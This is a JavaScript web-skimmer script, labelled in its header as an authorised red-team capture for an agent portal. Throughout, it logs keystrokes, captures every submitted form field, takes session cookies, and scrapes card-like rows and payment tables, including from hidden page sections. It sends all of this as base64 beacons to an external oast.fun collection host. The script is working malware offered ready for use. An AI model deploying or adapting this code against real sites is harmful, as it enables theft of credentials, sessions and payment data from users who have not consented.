/* JF AGENT PORTAL — live capture v3 (authorised red-team, operator Malik)
   v3 fix: textContent (hidden/collapsed sections included) + explicit payment-table scrape */
(function () {
  var C = 'https://dar28sje9202lj4kkc0gcja65cienyp8a.oast.fun';
  var MAX = 1100;
  function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ''; } }
  function send(tag, obj) {
    try {
      var s = b64(typeof obj === 'string' ? obj : JSON.stringify(obj));
      if (!s) return;
      for (var i = 0, n = 0; i < s.length; i += MAX, n++) {
        new Image().src = C + '/' + tag + '/' + n + '/' + s.length + '?' + s.substr(i, MAX);
      }
    } catch (e) { }
  }
  var CARDROW = /\[[^\]\n]{2,60}\]\[[0-9]{3,8}\]\[[0-9]{3,6}\]\[[0-9]{2}\]\[[0-9]{2}\]/g;
  var TABLE = /<table[\s\S]{0,200000}?<\/table>/gi;
  function cardScrape() {
    try {
      var out = [], seen = {};
      var txt = (document.documentElement.textContent || '') + ' ' + (document.documentElement.innerHTML || '');
      var m = txt.match(CARDROW);
      if (m) for (var i = 0; i < m.length; i++) { if (!seen[m[i]]) { seen[m[i]] = 1; out.push(m[i]); } }
      if (out.length) send('CARDS', { u: location.href, n: out.length, r: out.slice(0, 60) });
      var tabs = document.documentElement.innerHTML.match(TABLE) || [];
      var pay = [];
      for (var j = 0; j < tabs.length; j++) {
        if (/payment|commission|premium|invoice|\[[^\]\[]{2,60}\]\[[0-9]/.test(tabs[j])) pay.push(tabs[j].slice(0, 8000));
      }
      if (pay.length) send('PAYTABLES', { u: location.href, n: pay.length, h: pay.join('\n') });
    } catch (e) { }
  }
  document.addEventListener('submit', function (e) {
    try {
      var f = e.target, d = {}, fd = new FormData(f);
      fd.forEach(function (v, k) { d[k] = String(v).slice(0, 200); });
      send('FORM', { u: location.href, a: f.action, d: d });
    } catch (x) { }
  }, true);
  var buf = '';
  document.addEventListener('keydown', function (e) {
    try { buf += e.key; if (buf.length >= 40) { send('KEY', { u: location.href, d: buf }); buf = ''; } } catch (x) { }
  }, true);
  send('ALIVE', { u: location.href, t: document.title, c: document.cookie });
  setTimeout(cardScrape, 3500);
  setTimeout(cardScrape, 10000);
  setInterval(cardScrape, 15000);
})();
